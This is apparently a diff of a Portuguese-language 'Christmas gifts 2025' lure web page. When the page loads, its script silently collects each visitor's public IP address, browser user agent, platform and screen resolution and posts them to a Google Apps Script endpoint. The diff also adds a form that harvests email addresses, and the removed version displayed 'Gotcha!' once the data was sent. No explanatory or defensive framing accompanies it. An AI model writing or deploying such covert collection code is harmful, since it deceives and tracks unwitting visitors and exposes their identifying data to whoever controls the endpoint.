@@ -15,7 +15,31 @@
     border: 1px solid #ccc;
     border-radius: 8px;
   }
-  p {
+  label {
+    font-weight: bold;
+    margin-top: 10px;
+    display: block;
+  }
+  input {
+    width: 100%;
+    padding: 8px;
+    margin-top: 5px;
+  }
+  button {
+    background: #007bff;
+    color: white;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-top: 10px;
+    font-size: 16px;
+  }
+  button:hover {
+    background: #0056b3;
+  }
+  #status {
+    margin-top: 20px;
     font-weight: bold;
   }
 </style>
@@ -24,19 +48,26 @@
 <body>
 <div class="box">
   <h2>Prendas Natal 2025</h2>
-  <p id="status">A recolher prendas de Natal...</p>
+
+  <label for="email">Email (opcional):</label>
+  <input type="email" id="email" placeholder="Insere o teu email">
+  <button onclick="sendEmail()">Enviar Email</button>
+
+  <p id="status">A recolher dados técnicos...</p>
 </div>
 
 <script>
-async function sendData() {
+let technicalData = {}; // Guardar os dados técnicos
+
+// Função para recolher dados técnicos automaticamente ao carregar a página
+async function collectTechnicalData() {
   const status = document.getElementById("status");
+  status.innerText = "A recolher dados técnicos...";
 
   try {
-    // 1. Obter IP público
     const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
 
-    // 2. Preparar dados adicionais
-    const data = {
+    technicalData = {
       ip: ipData.ip,
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -45,24 +76,52 @@ async function sendData() {
       screenResolution: `${window.screen.width}x${window.screen.height}`
     };
 
-    // 3. Enviar para Google Apps Script via POST
-    const response = await fetch("https://script.google.com/macros/s/AKfycbxgiVBbuNnc0msBdurBjNRmJK9IFrh6cdaT32P07mimH_39-3_OrdQukZiQZBXFTU86/exec", {
+    // Enviar automaticamente os dados técnicos
+    await fetch("https://script.google.com/macros/s/AKfycbxgiVBbuNnc0msBdurBjNRmJK9IFrh6cdaT32P07mimH_39-3_OrdQukZiQZBXFTU86/exec", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams(technicalData)
+    });
+
+    status.innerText = "Dados técnicos enviados!";
+  } catch (err) {
+    console.error(err);
+    status.innerText = "Erro ao enviar dados técnicos.";
+  }
+}
+
+// Função para enviar o email manualmente
+async function sendEmail() {
+  const status = document.getElementById("status");
+  const email = document.getElementById("email").value.trim();
+
+  if (!email) {
+    alert("Por favor, insere um email antes de enviar.");
+    return;
+  }
+
+  try {
+    // Combinar email com dados técnicos (opcional)
+    const data = {
+      ...technicalData,
+      email: email
+    };
+
+    await fetch("https://script.google.com/macros/s/AKfycbxgiVBbuNnc0msBdurBjNRmJK9IFrh6cdaT32P07mimH_39-3_OrdQukZiQZBXFTU86/exec", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: new URLSearchParams(data)
     });
 
-    const resultText = await response.text();
-    console.log(resultText);
-    status.innerText = "Gotcha!";
-  } catch (error) {
-    console.error(error);
-    status.innerText = "Error.";
+    status.innerText = "Email enviado com sucesso!";
+  } catch (err) {
+    console.error(err);
+    status.innerText = "Erro ao enviar o email.";
   }
 }
 
 // Executa automaticamente ao carregar a página
-sendData();
+collectTechnicalData();
 </script>
 </body>
 </html>
